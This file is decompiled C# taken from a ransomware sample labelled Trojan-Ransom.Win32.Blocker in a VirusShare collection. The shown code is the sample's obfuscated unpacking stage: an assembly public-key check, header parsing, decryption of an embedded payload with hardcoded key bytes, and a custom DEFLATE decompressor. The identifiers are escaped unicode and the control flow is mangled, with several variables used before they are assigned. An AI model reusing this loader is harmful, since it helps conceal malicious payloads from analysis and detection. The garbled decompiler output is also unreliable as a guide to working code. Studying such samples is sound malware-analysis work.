// Decompiled with JetBrains decompiler
// Type: .
// Assembly: tunnel, Version=5.33.30.2, Culture=neutral, PublicKeyToken=c03e3aaf025faf44
// MVID: A9BB91E8-EB42-44AA-8017-DD55B6CE8F16
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.jgbt-a87f6163078bac287118a5d0a2cfe80d7fab70d3350f37b021a58f15059ef30b.exe

using \u0001;
using \u0002;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0002
{
  internal class \u0002
  {
    private static bool \u0002([In] Assembly obj0, [In] Assembly obj1)
    {
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
label_19:
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
      int num1 = publicKey2 == null ? 1 : 0;
      int num2 = 2;
      int num3;
      int num4;
      int num5;
      if (num2 != 0)
      {
        if (num2 != 0)
        {
          num4 = publicKey1 == null ? 1 : 0;
          num3 = num1;
        }
        else
        {
          num5 = num1;
          goto label_15;
        }
      }
      else
        goto label_17;
label_5:
      if (num3 != num4)
        return false;
      int num6;
      if (publicKey2 != null)
        num6 = 0;
      else
        goto label_18;
label_9:
      int index = num6;
      if (false)
        goto label_19;
      else
        goto label_16;
label_15:
      index = num5;
label_16:
      int num7 = index;
      num2 = publicKey2.Length;
      num1 = num7;
label_17:
      int num8 = num2;
      if (num1 < num8)
      {
        num3 = (int) publicKey2[index];
        num4 = (int) publicKey1[index];
        if (true)
        {
          if (num3 != num4)
          {
            int num9 = 0;
            if (num9 == 0)
              return num9 != 0;
            num6 = num9;
            goto label_9;
          }
          else
          {
            num5 = index + 1;
            goto label_15;
          }
        }
        else
          goto label_5;
      }
label_18:
      return true;
    }

    public static byte[] \u0002([In] byte[] obj0)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0002.\u0002.\u0002(executingAssembly, callingAssembly))
        return (byte[]) null;
      \u0002.\u0002.\u0007 obj1 = new \u0002.\u0002.\u0007(obj0);
      byte[] numArray1 = new byte[0];
      int num1 = obj1.\u0003();
      int num2;
      byte[] buffer1;
      if (num1 == 67324752)
      {
        short num3 = (short) obj1.\u0002();
        int num4 = obj1.\u0002();
        int num5 = obj1.\u0002();
        if (num1 != 67324752 || num3 != (short) 20 || num4 != 0 || num5 != 8)
          throw new FormatException("Wrong Header Signature");
        obj1.\u0003();
        obj1.\u0003();
        obj1.\u0003();
        num2 = obj1.\u0003();
        int count1 = obj1.\u0002();
        int count2 = obj1.\u0002();
        if (count1 > 0)
        {
          byte[] buffer2 = new byte[count1];
          obj1.Read(buffer2, 0, count1);
        }
        if (true)
        {
          if (count2 > 0)
          {
            byte[] buffer3 = new byte[count2];
            obj1.Read(buffer3, 0, count2);
          }
          buffer1 = new byte[obj1.Length - obj1.Position];
        }
        else
          goto label_14;
      }
      else
        goto label_17;
label_11:
      int length1 = obj1.Read(buffer1, 0, buffer1.Length);
      \u0002.\u0002.\u0001 obj2;
      if (true)
      {
        obj2 = new \u0002.\u0002.\u0001(buffer1);
        length1 = num2;
      }
      numArray1 = new byte[length1];
label_14:
      obj2.\u0002(numArray1, 0, numArray1.Length);
      int num6 = 0;
label_15:
      if (num6 == 0)
        goto label_49;
      else
        goto label_11;
label_17:
      num6 = num1 >> 24;
      if (true)
      {
        int num7 = num6;
        if (num1 - (num7 << 24) != 8223355)
          throw new FormatException("Unknown Header");
        int length2;
        int num8;
        if (num7 == 1)
        {
          length2 = obj1.\u0003();
          numArray1 = new byte[length2];
          num8 = 0;
          goto label_24;
        }
        else
          goto label_25;
label_23:
        int length3;
        byte[] buffer4 = new byte[length3];
        obj1.Read(buffer4, 0, buffer4.Length);
        int num9;
        new \u0002.\u0002.\u0001(buffer4).\u0002(numArray1, num8, num9);
        num8 += num9;
label_24:
        int length4;
        if (num8 < length2)
        {
          length4 = obj1.\u0003();
          if (true)
          {
            int num10 = length4;
            num9 = obj1.\u0003();
            length3 = num10;
            goto label_23;
          }
          else
            goto label_39;
        }
label_25:
        if (num7 == 2)
        {
          byte[] numArray2 = new byte[8]
          {
            (byte) 143,
            (byte) 89,
            (byte) 197,
            (byte) 101,
            (byte) 200,
            (byte) 145,
            (byte) 119,
            (byte) 107
          };
          byte[] numArray3 = new byte[8]
          {
            (byte) 168,
            (byte) 3,
            (byte) 245,
            (byte) 218,
            (byte) 199,
            (byte) 19,
            (byte) 91,
            (byte) 190
          };
          using (\u0002.\u0001 obj3 = new \u0002.\u0001())
          {
            do
            {
              using (ICryptoTransform cryptoTransform = obj3.\u0002(numArray2, numArray3, true))
                numArray1 = \u0002.\u0002.\u0002(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
            }
            while (false);
          }
        }
        byte[] numArray4;
        if (num7 == 3)
        {
          length3 = 16;
          if (length3 != 0)
          {
            byte[] numArray5 = new byte[length3];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray5, __fieldref (\u0003.\u0001));
            numArray4 = numArray5;
            length4 = 16;
          }
          else
            goto label_23;
        }
        else
          goto label_49;
label_39:
        byte[] numArray6 = new byte[length4];
        // ISSUE: field reference
        RuntimeHelpers.InitializeArray((Array) numArray6, __fieldref (\u0003.\u0001));
        byte[] numArray7 = numArray6;
        using (\u0003 obj4 = new \u0003())
        {
          using (ICryptoTransform cryptoTransform = obj4.\u0002(numArray4, numArray7, true))
            numArray1 = \u0002.\u0002.\u0002(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      else
        goto label_15;
label_49:
      obj1.Close();
      return numArray1;
    }

    internal sealed class \u0001
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private bool \u0001;
      private \u0002.\u0002.\u0002 \u0001;
      private \u0002.\u0002.\u0003 \u0001;
      private \u0002.\u0002.\u0005 \u0001;
      private \u0002.\u0002.\u0004 \u0001;
      private \u0002.\u0002.\u0004 \u0002;

      public \u0001([In] byte[] obj0)
      {
        this.\u0001 = new \u0002.\u0002.\u0002();
        this.\u0001 = new \u0002.\u0002.\u0003();
        this.\u0001 = 2;
        this.\u0001.\u0002(obj0, 0, obj0.Length);
      }

      private bool \u0002()
      {
        int num1 = this.\u0001.\u0002();
label_30:
        int num2;
        int num3;
        int num4;
        while (true)
        {
          int num5 = num1;
          if (true)
            goto label_31;
label_4:
          if (num5 < 258)
            break;
label_6:
          if (((num2 = this.\u0001.\u0002(this.\u0001)) & -256) != 0)
          {
            if (num2 >= 257)
            {
              this.\u0003 = \u0002.\u0002.\u0001.\u0001[num2 - 257];
              this.\u0002 = \u0002.\u0002.\u0001.\u0002[num2 - 257];
            }
            else
              goto label_8;
          }
          else
          {
            this.\u0001.\u0002(num2);
            num5 = --num1;
            goto label_4;
          }
label_14:
          int num6 = this.\u0002;
label_15:
          if (true)
          {
            if (num6 > 0)
            {
              this.\u0001 = 8;
              int num7 = this.\u0001.\u0002(this.\u0002);
              if (num7 >= 0)
              {
                this.\u0001.\u0002(this.\u0002);
                this.\u0003 += num7;
              }
              else
                goto label_18;
            }
            this.\u0001 = 9;
          }
          else
            goto label_26;
label_21:
          int index1 = this.\u0002.\u0002(this.\u0001);
          if (index1 >= 0)
          {
            this.\u0004 = \u0002.\u0002.\u0001.\u0003[index1];
            this.\u0002 = \u0002.\u0002.\u0001.\u0004[index1];
          }
          else
            goto label_22;
label_24:
          int num8;
          if (this.\u0002 > 0)
          {
            this.\u0001 = 10;
            num8 = this.\u0001.\u0002(this.\u0002);
            num6 = num8;
          }
          else
            goto label_29;
label_26:
          if (num6 >= 0)
          {
            this.\u0001.\u0002(this.\u0002);
            this.\u0004 += num8;
          }
          else
            goto label_27;
label_29:
          this.\u0001.\u0002(this.\u0003, this.\u0004);
          num1 -= this.\u0003;
          this.\u0001 = 7;
          continue;
label_31:
          int num9;
          for (int index2 = 258; num5 >= index2; num5 = num9)
          {
            num9 = this.\u0001;
            if (true)
            {
              int num10 = 7;
              if (num10 != 0)
              {
                switch (num9 - num10)
                {
                  case 0:
                    goto label_6;
                  case 1:
                    goto label_14;
                  case 2:
                    goto label_21;
                  case 3:
                    goto label_24;
                  default:
                    goto label_30;
                }
              }
              else
                index2 = num10;
            }
            else
            {
              num3 = num9;
              goto label_9;
            }
          }
          num4 = 1;
          if (num4 == 0)
          {
            num6 = num4;
            goto label_15;
          }
          else
            goto label_3;
        }
        return true;
label_8:
        num3 = num2;
label_9:
        if (num3 >= 0)
          goto label_11;
label_10:
        return false;
label_11:
        this.\u0002 = (\u0002.\u0002.\u0004) null;
        this.\u0001 = (\u0002.\u0002.\u0004) null;
        this.\u0001 = 2;
        if (true)
          return true;
        goto label_10;
label_18:
        return false;
label_22:
        return false;
label_27:
        return false;
label_3:
        return num4 != 0;
      }

      private bool \u0003()
      {
        int num1 = 0;
        if (num1 == 0)
        {
          if (num1 == 0)
          {
            int num2 = this.\u0001;
            switch (num2)
            {
              case 2:
                goto label_35;
              case 3:
                this.\u0005 = num2 = this.\u0001.\u0002(16);
                break;
              case 4:
label_19:
                if (this.\u0001.\u0002(16) < 0)
                  return false;
                this.\u0001.\u0002(16);
                this.\u0001 = 5;
                goto case 5;
              case 5:
                num1 = this.\u0001.\u0002(this.\u0001, this.\u0005);
                goto label_23;
              case 6:
                if (!this.\u0001.\u0002(this.\u0001))
                  return false;
                this.\u0001 = this.\u0001.\u0002();
                this.\u0002 = this.\u0001.\u0003();
                if (true)
                {
                  this.\u0001 = 7;
                  goto case 7;
                }
                else
                  break;
              case 7:
              case 8:
              case 9:
              case 10:
                return this.\u0002();
              case 12:
                return false;
              default:
                return false;
            }
            if (true)
            {
              if (num2 < 0)
                return false;
              this.\u0001.\u0002(16);
              this.\u0001 = 4;
              goto label_19;
            }
            else
              goto label_24;
          }
          else
            goto label_39;
label_35:
          if (this.\u0001)
          {
            this.\u0001 = 12;
            return false;
          }
label_37:
          int num3 = this.\u0001.\u0002(3);
          int num4;
          if (true)
            num4 = num3;
label_39:
          if (num4 < 0)
            return false;
          this.\u0001.\u0002(3);
          if (true)
          {
            if ((num4 & 1) != 0)
              this.\u0001 = true;
            switch (num4 >> 1)
            {
              case 0:
                this.\u0001.\u0002();
                this.\u0001 = 3;
                goto label_12;
              case 1:
                this.\u0001 = \u0002.\u0002.\u0004.\u0001;
                break;
              case 2:
                this.\u0001 = new \u0002.\u0002.\u0005();
                this.\u0001 = 6;
                goto label_12;
              default:
                goto label_12;
            }
          }
          if (true)
          {
            this.\u0002 = \u0002.\u0002.\u0004.\u0002;
            this.\u0001 = 7;
          }
          else
            goto label_37;
label_12:
          if (true)
            return true;
          goto label_35;
        }
label_23:
        int num5 = num1;
label_24:
        this.\u0005 -= num5;
        if (this.\u0005 != 0)
          return !this.\u0001.\u0002();
        this.\u0001 = 2;
        return true;
      }

      public int \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 0;
        int num2;
        while (true)
        {
          if (num1 == 0)
          {
            num2 = 0;
            goto label_15;
          }
label_6:
          int num3 = num2;
          int num4;
          int num5;
          if (true)
          {
            int num6 = num4;
            num2 = num3 + num6;
            obj2 -= num4;
            num5 = obj2;
          }
          else
            goto label_13;
label_8:
          if (num5 == 0)
            break;
label_10:
          num5 = this.\u0003() ? 1 : 0;
          if (true)
          {
            if (num5 == 0)
              num3 = this.\u0001.\u0003();
            else
              goto label_15;
          }
          else
            goto label_8;
label_13:
          if (num3 <= 0 || this.\u0001 == 11)
            goto label_14;
label_15:
          int num7;
          do
          {
            num7 = this.\u0001;
            if (true)
            {
              if (num7 == 11)
                goto label_10;
            }
            else
              goto label_5;
          }
          while (false);
          goto label_16;
label_5:
          num1 = num7;
          continue;
label_16:
          num4 = this.\u0001.\u0002(obj0, obj1, obj2);
          obj1 += num4;
          goto label_6;
        }
        return num2;
label_14:
        return num2;
      }

      static \u0001()
      {
        do
        {
          int length1 = 29;
label_1:
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0003.\u0001));
          \u0002.\u0002.\u0001.\u0001 = numArray1;
          while (true)
          {
            \u0002.\u0002.\u0001.\u0002 = new int[29]
            {
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              1,
              1,
              1,
              1,
              2,
              2,
              2,
              2,
              3,
              3,
              3,
              3,
              4,
              4,
              4,
              4,
              5,
              5,
              5,
              5,
              0
            };
            if (true)
            {
              if (true)
                \u0002.\u0002.\u0001.\u0003 = new int[30]
                {
                  1,
                  2,
                  3,
                  4,
                  5,
                  7,
                  9,
                  13,
                  17,
                  25,
                  33,
                  49,
                  65,
                  97,
                  129,
                  193,
                  257,
                  385,
                  513,
                  769,
                  1025,
                  1537,
                  2049,
                  3073,
                  4097,
                  6145,
                  8193,
                  12289,
                  16385,
                  24577
                };
              else
                continue;
            }
            int length2 = 30;
            if (length2 == 0)
            {
              length1 = length2;
              goto label_1;
            }
            else
            {
              int[] numArray2 = new int[length2];
              // ISSUE: field reference
              RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0003.\u0001));
              \u0002.\u0002.\u0001.\u0004 = numArray2;
              break;
            }
          }
        }
        while (false);
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public int \u0002([In] int obj0)
      {
label_0:
        int num1 = this.\u0003;
        int num2;
        while (true)
        {
          int num3 = obj0;
          if (num1 < num3)
            goto label_15;
label_6:
          long num4 = (long) this.\u0001;
          int num5 = 1;
          int num6 = obj0;
label_7:
          int num7 = 31;
          int num8;
          int num9;
          while (true)
          {
            int num10 = num6 & num7;
            num8 = num5 << num10;
            num9 = 1;
            if (num9 != 0)
            {
              while (true)
              {
                if (true)
                {
                  if (num9 == 0)
                  {
                    num6 = num9;
                    num5 = num8;
                    goto label_7;
                  }
                  else
                    goto label_12;
                }
              }
              num7 = num9;
              num6 = num9;
              num5 = num8;
            }
            else
              break;
          }
label_12:
          long num11 = (long) (num8 - num9);
          num2 = (int) (num4 & num11);
          if (false)
          {
            num1 = num2;
            continue;
          }
          goto label_3;
label_15:
          if (this.\u0001 != this.\u0002)
          {
            \u0002.\u0002.\u0002 obj1 = this;
            int num12 = (int) obj1.\u0001;
            byte[] numArray1 = this.\u0001;
            \u0002.\u0002.\u0002 obj2 = this;
            int num13 = obj2.\u0001;
            if (true)
              goto label_17;
label_4:
            obj2.\u0001 = num13 + 1;
            int num14;
            int index1 = num14;
            int num15 = (int) numArray1[index1] & (int) byte.MaxValue;
            byte[] numArray2 = this.\u0001;
            num14 = this.\u0001++;
            int index2 = num14;
            int num16 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
            int num17 = (num15 | num16) << this.\u0003;
            obj1.\u0001 = (uint) (num12 | num17);
            if (true)
            {
              this.\u0003 += 16;
              goto label_6;
            }
            else
              goto label_0;
label_17:
            num14 = num13;
            goto label_4;
          }
          else
            break;
        }
        return -1;
label_3:
        return num2;
      }

      public void \u0002([In] int obj0)
      {
label_0:
        this.\u0001 >>= obj0;
label_1:
        if (true)
        {
label_6:
          this.\u0003 -= obj0;
          do
          {
            if (true)
            {
              if (false)
                goto label_1;
            }
            else
              goto label_6;
          }
          while (false);
        }
        else
          goto label_0;
      }

      [SpecialName]
      public int \u0002() => this.\u0003;

      [SpecialName]
      public int \u0003()
      {
        int num1 = this.\u0002;
        int num2;
        while (true)
        {
          int num3 = this.\u0001;
          int num4 = num1 - num3;
          if (true)
          {
            if (false)
            {
              num1 = num4;
            }
            else
            {
              num1 = num4;
              break;
            }
          }
          else
          {
            num2 = num4;
            goto label_5;
          }
        }
        goto label_8;
label_5:
        if (true)
          return num2;
        num1 = num2;
label_8:
        int num5 = this.\u0003 >> 3;
        num2 = num1 + num5;
        goto label_5;
      }

      public void \u0002()
      {
        this.\u0001 >>= this.\u0003 & 7;
        this.\u0003 &= -8;
      }

      [SpecialName]
      public bool \u0002() => this.\u0001 == this.\u0002;

      public int \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        if (true)
          goto label_22;
label_4:
        int num1;
        int num2;
        while (true)
        {
          int num3 = this.\u0003;
          int num4 = 0;
          if (num4 == 0)
            goto label_5;
label_3:
          num1 = num3 + num4;
          continue;
label_5:
          int num5;
          int num6;
          if (num4 == 0)
          {
            if (true)
            {
              if (num3 <= num4 || obj2 <= 0)
              {
                num2 = obj2;
              }
              else
              {
                obj0[obj1++] = (byte) this.\u0001;
                goto label_24;
              }
            }
            else
            {
              num6 = num4;
              num5 = num3;
              goto label_13;
            }
          }
          else
            goto label_21;
label_9:
          int num7;
          if (num2 != 0)
            num7 = this.\u0002;
          else
            break;
label_12:
          int num8 = this.\u0001;
          int num9 = num7 - num8;
          num5 = obj2;
          num6 = num9;
label_13:
          if (num5 > num6)
            obj2 = num9;
          Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
          this.\u0001 += obj2;
          if ((this.\u0001 - this.\u0002 & 1) != 0)
          {
            this.\u0001 = (uint) this.\u0001[this.\u0001++] & (uint) byte.MaxValue;
            this.\u0003 = 8;
          }
          if (true)
          {
            if (true)
            {
              int num10 = num1;
              if (false)
              {
                num7 = num10;
                goto label_12;
              }
              else
              {
                num4 = obj2;
                num3 = num10;
              }
            }
            else
              break;
          }
          else
            goto label_24;
label_21:
          num2 = num3 + num4;
          if (false)
            goto label_9;
          else
            goto label_2;
label_24:
          this.\u0001 >>= 8;
          this.\u0003 -= 8;
          obj2--;
          int num11 = num1;
          num4 = 1;
          num3 = num11;
          goto label_3;
        }
        return num1;
label_2:
        return num2;
label_22:
        num1 = 0;
        goto label_4;
      }

      public void \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        if (true)
          goto label_6;
label_4:
        this.\u0003 += 8;
label_5:
        this.\u0001 = obj0;
        this.\u0001 = obj1;
        int num;
        this.\u0002 = num;
        return;
label_6:
        if (this.\u0001 < this.\u0002)
          throw new InvalidOperationException();
        num = obj1 + obj2;
        if (0 > obj1 || obj1 > num || num > obj0.Length)
          throw new ArgumentOutOfRangeException();
        if ((obj2 & 1) != 0)
        {
          this.\u0001 |= (uint) (((int) obj0[obj1++] & (int) byte.MaxValue) << this.\u0003);
          goto label_4;
        }
        else
          goto label_5;
      }
    }

    internal sealed class \u0003
    {
      private byte[] \u0001 = new byte[32768];
      private int \u0001 = 0;
      private int \u0002 = 0;

      public void \u0002([In] int obj0)
      {
        int num1;
        if (true)
        {
          \u0002.\u0002.\u0003 obj = this;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
        }
        int num3 = num1;
        if (false)
          goto label_2;
label_1:
        if (num3 != 32768)
        {
          byte[] numArray = this.\u0001;
          \u0002.\u0002.\u0003 obj = this;
          int num4;
          int num5 = num4 = obj.\u0001;
          obj.\u0001 = num4 + 1;
          int index = num5;
          int num6 = (int) (byte) obj0;
          numArray[index] = (byte) num6;
          num3 = 7;
        }
        else
          goto label_7;
label_2:
        if (true)
        {
          if (num3 != 0)
          {
            this.\u0001 &= (int) short.MaxValue;
            return;
          }
        }
        else
          goto label_1;
label_7:
        throw new InvalidOperationException();
      }

      private void \u0002([In] int obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 4;
        if (num1 != 0)
        {
          if (num1 != 0)
            goto label_5;
        }
        else
          goto label_6;
label_2:
        if (false)
          return;
        byte[] numArray = this.\u0001;
        \u0002.\u0002.\u0003 obj = this;
        int num2;
        int num3 = num2 = obj.\u0001;
        obj.\u0001 = num2 + 1;
        int index = num3;
        int num4 = (int) this.\u0001[obj0++];
        numArray[index] = (byte) num4;
        this.\u0001 &= (int) short.MaxValue;
        goto label_10;
label_5:
        num1 = 0;
label_6:
        int num5;
        int num6;
        if (num1 == 0)
        {
          int num7 = obj1;
          num6 = num7 - 1;
          num5 = num7;
        }
        else
          goto label_10;
label_8:
        obj1 = num6;
        if (num5 <= 0)
          return;
        goto label_2;
label_10:
        num5 = obj0;
        num6 = (int) short.MaxValue;
        if (num6 != 0)
        {
          obj0 = num5 & num6;
          goto label_5;
        }
        else
          goto label_8;
      }

      public void \u0002([In] int obj0, [In] int obj1)
      {
        \u0002.\u0002.\u0003 obj = this;
        int num1 = obj.\u0002 + obj0;
        if (true)
          goto label_8;
label_1:
        obj.\u0002 = num1;
        int num2;
        if (num2 > 32768)
          throw new InvalidOperationException();
        int sourceIndex = this.\u0001 - obj1 & (int) short.MaxValue;
        int num3 = 32768 - obj0;
        if (sourceIndex <= num3 && this.\u0001 < num3)
        {
          if (obj0 <= obj1)
          {
            Array.Copy((Array) this.\u0001, sourceIndex, (Array) this.\u0001, this.\u0001, obj0);
            this.\u0001 += obj0;
            return;
          }
          while (obj0-- > 0)
            this.\u0001[this.\u0001++] = this.\u0001[sourceIndex++];
          return;
        }
        this.\u0002(sourceIndex, obj0, obj1);
        return;
label_8:
        num2 = num1;
        goto label_1;
      }

      public int \u0002([In] \u0002.\u0002.\u0002 obj0, [In] int obj1)
      {
        int val1_1 = obj1;
        int val1_2;
        int val2_1;
        if (true)
        {
          int val2_2 = 32768;
          if (val2_2 != 0)
            val2_2 -= this.\u0002;
          int num = Math.Min(val1_1, val2_2);
          val2_1 = obj0.\u0003();
          val1_2 = num;
        }
        else
          goto label_16;
label_15:
        int num1 = Math.Min(val1_2, val2_1);
        if (true)
        {
          obj1 = num1;
          val1_1 = 32768;
        }
        else
          val1_1 = num1;
label_16:
        int num2 = this.\u0001;
        int num3;
        while (true)
        {
          int num4 = val1_1 - num2;
          int num5;
          if (true)
            num5 = num4;
          int num6;
          int num7;
          do
          {
            val1_2 = obj1;
            val2_1 = num5;
            if (true)
            {
              if (val1_2 > val2_1)
              {
                num3 = obj0.\u0002(this.\u0001, this.\u0001, num5);
                num6 = num3;
                num7 = num5;
                if (true)
                {
                  if (num6 == num7)
                    num3 += obj0.\u0002(this.\u0001, 0, obj1 - num5);
                }
                else
                  goto label_2;
              }
              else
                num3 = obj0.\u0002(this.\u0001, this.\u0001, obj1);
              this.\u0001 = this.\u0001 + num3 & (int) short.MaxValue;
            }
            else
              goto label_15;
          }
          while (false);
          break;
label_2:
          num2 = num7;
          val1_1 = num6;
        }
        this.\u0002 += num3;
        return num3;
      }

      public int \u0002() => 32768 - this.\u0002;

      public int \u0003() => this.\u0002;

      public int \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = this.\u0001;
        int num2 = obj2;
        int num3;
        while (true)
        {
          int num4 = this.\u0002;
          if (num2 <= num4)
            goto label_18;
          else
            goto label_17;
label_3:
          int num5;
          int num6;
          if (num6 == 0)
          {
            num2 = num5;
            continue;
          }
label_4:
          num1 = num5 & (int) short.MaxValue;
label_5:
          num3 = obj2;
          num5 = obj2;
          num6 = 8;
          int num7;
          int num8;
          if (num6 != 0)
          {
            int length;
            if (num6 != 0)
            {
              if (num6 != 0)
              {
                int num9 = num1;
                length = num5 - num9;
                int num10 = length;
                num6 = 0;
                num5 = num10;
              }
              else
                goto label_4;
            }
            if (num5 > num6)
            {
              Array.Copy((Array) this.\u0001, 32768 - length, (Array) obj0, obj1, length);
              int num11 = obj1;
              num8 = length;
              num7 = num11;
            }
            else
              goto label_12;
          }
          else
            goto label_3;
label_11:
          obj1 = num7 + num8;
          obj2 = num1;
label_12:
          Array.Copy((Array) this.\u0001, num1 - obj2, (Array) obj0, obj1, obj2);
          this.\u0002 -= num3;
          if (this.\u0002 >= 0)
          {
            if (false)
              goto label_5;
            else
              goto label_15;
          }
          else
            break;
label_17:
          obj2 = this.\u0002;
          goto label_5;
label_18:
          num7 = this.\u0001 - this.\u0002;
          num8 = obj2;
          if (true)
          {
            int num12 = num7 + num8;
            num6 = 4;
            num5 = num12;
            goto label_3;
          }
          else
            goto label_11;
        }
        throw new InvalidOperationException();
label_15:
        return num3;
      }
    }

    internal sealed class \u0004
    {
      private short[] \u0001;
      public static readonly \u0002.\u0002.\u0004 \u0001;
      public static readonly \u0002.\u0002.\u0004 \u0002;

      static \u0004()
      {
label_0:
        byte[] numArray1 = new byte[288];
        if (true)
          goto label_17;
label_1:
        if (true)
          goto label_18;
label_2:
        if (false)
          goto label_8;
        else
          goto label_20;
label_6:
        int num;
        byte[] numArray2;
        while (num < 280)
          numArray2[num++] = (byte) 7;
        goto label_10;
label_8:
        if (true)
          numArray2[num++] = (byte) 8;
        else
          goto label_15;
label_10:
        if (num >= 288)
        {
          if (true)
          {
            \u0002.\u0002.\u0004.\u0001 = new \u0002.\u0002.\u0004(numArray2);
            numArray2 = new byte[32];
            num = 0;
            while (num < 32)
              numArray2[num++] = (byte) 5;
          }
          else
            goto label_0;
        }
        else
          goto label_8;
label_15:
        if (false)
          goto label_6;
label_16:
        \u0002.\u0002.\u0004.\u0002 = new \u0002.\u0002.\u0004(numArray2);
        if (true)
          return;
        goto label_15;
label_20:
        while (num < 144)
          numArray2[num++] = (byte) 8;
        for (; num < 256; numArray2[num++] = (byte) 9)
        {
          if (false)
            goto label_16;
        }
        goto label_6;
label_18:
        num = 0;
        goto label_2;
label_17:
        numArray2 = numArray1;
        goto label_1;
      }

      public \u0004([In] byte[] obj0) => this.\u0002(obj0);

      private void \u0002([In] byte[] obj0)
      {
        int[] numArray1 = new int[16];
        int[] numArray2 = new int[16];
        int index1 = 0;
        int num1;
        int num2;
        while (true)
        {
          num1 = index1;
          num2 = obj0.Length;
          if (true)
          {
            if (num1 < num2)
            {
              int num3 = (int) obj0[index1];
              if (num3 > 0)
                goto label_40;
label_1:
              ++index1;
              continue;
label_40:
              int[] numArray3;
              int index2;
              int num4 = (numArray3 = numArray1)[(IntPtr) (index2 = num3)] + 1;
              numArray3[index2] = num4;
              goto label_1;
            }
            else
              break;
          }
          else
            goto label_6;
        }
        int num5 = 0;
        int length1 = 512;
        int index3 = 1;
        goto label_11;
label_6:
        int num6 = 16 - index3;
        int num7;
        int num8;
        int num9;
        if (true)
        {
          int num10 = num6 & 31;
          int num11 = num2 << num10;
          num5 = num1 + num11;
          if (index3 >= 10)
          {
            int num12 = numArray2[index3] & 130944;
            int num13 = num5 & 130944;
            int num14 = length1;
            int num15 = num13;
            num9 = num12;
            num8 = num15;
            num7 = num14;
          }
          else
            goto label_10;
        }
        else
          goto label_27;
label_9:
        int num16 = num8 - num9 >> 16 - index3;
        length1 = num7 + num16;
label_10:
        ++index3;
label_11:
        int num17;
        int index4;
        if (index3 <= 15)
        {
          numArray2[index3] = num5;
          int num18 = num5;
          num2 = numArray1[index3];
          num1 = num18;
          goto label_6;
        }
        else
        {
          this.\u0001 = new short[length1];
          num17 = 512;
          index4 = 15;
          goto label_20;
        }
label_13:
        int num19 = num5 & 130944;
        int num20 = num5 - (numArray1[index4] << 16 - index4);
        int num21;
        int num22;
        if (true)
        {
          num5 = num20;
          for (int index5 = num5 & 130944; index5 < num19; index5 += 128)
          {
            this.\u0001[(int) \u0002.\u0002.\u0006.\u0002(index5)] = (short) (-num17 << 4 | index4);
            num7 = num17;
            num8 = 1;
            num9 = index4 - 9;
            if (true)
            {
              int num23 = num9 & 31;
              int num24 = num8 << num23;
              num17 = num7 + num24;
            }
            else
              goto label_9;
          }
          int num25 = index4;
          num22 = 1;
          num21 = num25;
        }
        else
          goto label_21;
label_19:
        index4 = num21 - num22;
label_20:
        num20 = index4;
label_21:
        int index6;
        if (num20 < 10)
        {
          index6 = 0;
          goto label_37;
        }
        else
          goto label_13;
label_24:
        int index7;
        int index8;
        int num26;
        int num27;
        if (index7 != 0)
        {
          num5 = numArray2[index7];
          index8 = (int) \u0002.\u0002.\u0006.\u0002(num5);
          if (index7 > 9)
          {
            int num28 = (int) this.\u0001[index8 & 511];
            num26 = 1 << (num28 & 15);
            num27 = -(num28 >> 4);
            goto label_32;
          }
        }
        else
          goto label_36;
label_26:
        this.\u0001[index8] = (short) (index6 << 4 | index7);
        int num29 = index8;
        num6 = index7 & 31;
        num2 = 1;
        num1 = num29;
label_27:
        int num30 = num2 << num6;
        index8 = num1 + num30;
        if (true)
        {
          if (true)
          {
            if (index8 < 512)
              goto label_26;
            else
              goto label_35;
          }
          else
            goto label_24;
        }
        else
          goto label_13;
label_32:
        int num31 = num27;
        do
        {
          this.\u0001[num31 | index8 >> 9] = (short) (index6 << 4 | index7);
          num21 = index8;
          num22 = 1 << index7;
          if (true)
            index8 = num21 + num22;
          else
            goto label_19;
        }
        while (index8 < num26);
label_35:
        numArray2[index7] = num5 + (1 << 16 - index7);
label_36:
        ++index6;
label_37:
        num27 = index6;
        if (true)
        {
          int length2 = obj0.Length;
          if (num27 >= length2)
            return;
          index7 = (int) obj0[index6];
          goto label_24;
        }
        else
          goto label_32;
      }

      public int \u0002([In] \u0002.\u0002.\u0002 obj0)
      {
        int num1 = obj0.\u0002(9);
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        int num8;
        while (true)
        {
          int index = num1;
          if (num1 < 0)
            goto label_20;
          else
            goto label_25;
label_3:
          int num9;
          if (num5 < 0)
          {
            num9 = -(num2 >> 4);
            int num10 = num2 & 15;
            num5 = obj0.\u0002(num10);
          }
          else
          {
            obj0.\u0002(num2 & 15);
            num7 = num2;
            if (false)
            {
              num5 = num7;
              goto label_12;
            }
            else
              break;
          }
label_8:
          if (true)
          {
            if (true)
              num6 = num5;
            else
              goto label_18;
          }
          else
            goto label_3;
